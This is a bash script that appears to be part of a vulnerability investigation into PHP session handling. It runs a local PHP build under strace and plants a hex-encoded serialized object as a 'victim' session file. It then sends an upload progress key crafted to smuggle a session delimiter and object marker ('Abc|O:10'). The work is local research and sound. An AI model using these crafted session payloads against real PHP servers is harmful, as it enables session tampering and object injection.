#!/bin/bash
# wp2_binobj_trace.sh - strace the cx_php_binary_v_binobj_pipe case (file deleted mid-request?)
CL=$(cd "$(dirname "$0")" && pwd)
ART=/tmp/p2s_c2
DIR=$ART/binobj_trace
SESS=$DIR/sess
PORT=18805
SID=vicsid00000000000000000000000
PHPBIN=/tmp/php8512_build/plain2/sapi/cli/php
BIN_OBJ='036f626a4f3a363a2253706c4f626a223a323a7b733a313a2261223b733a313a2263223b733a343a2273656c66223b723a313b7d'
PIPE='4162637C4F3A3130'

rm -rf "$DIR"; mkdir -p "$SESS"
cat > "$DIR/php.ini" <<EOF
session.save_handler = files
session.save_path = "$SESS"
session.serialize_handler = php_binary
session.use_strict_mode = 0
session.upload_progress.enabled = 1
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.freq = 1
session.upload_progress.min_freq = 0
session.upload_progress.cleanup = 1
session.gc_probability = 0
display_errors = 1
log_errors = 1
error_reporting = E_ALL
post_max_size = 64M
upload_max_filesize = 64M
memory_limit = 1024M
EOF

pkill -f "127.0.0.1:$PORT" 2>/dev/null; sleep 0.5
printf "%s" "$BIN_OBJ" | xxd -r -p > "$SESS/sess_$SID"
echo "victim before: $(stat -c %s "$SESS/sess_$SID") bytes"

strace -f -o "$DIR/trace.log" -tt -e trace=openat,ftruncate,pwrite64,write,unlink,unlinkat,read,pread64 \
  "$PHPBIN" -c "$DIR/php.ini" -S 127.0.0.1:$PORT -t "$CL/docroot" \
  > "$DIR/server_out.log" 2> "$DIR/server_err.log" &
SPID=$!
for i in $(seq 1 100); do curl -s -o /dev/null --max-time 1 "http://127.0.0.1:$PORT/up.php" && break; sleep 0.1; done

python3 "$CL/wp2_upclient.py" $PORT full $SID --key "$PIPE" --filesize 4096 > "$DIR/client.log" 2>&1
sleep 0.2
S1=$(stat -c %s "$SESS/sess_$SID" 2>/dev/null || echo -1)
sleep 2
S2=$(stat -c %s "$SESS/sess_$SID" 2>/dev/null || echo -1)
kill $SPID 2>/dev/null; wait $SPID 2>/dev/null
echo "size at +0.2s: $S1   size at +2.2s: $S2"
echo "--- warnings ---"
grep -iE "session|warning" "$DIR/server_err.log" | head -20
echo "--- session-file syscalls ---"
grep "sess_$SID" "$DIR/trace.log" | head -50
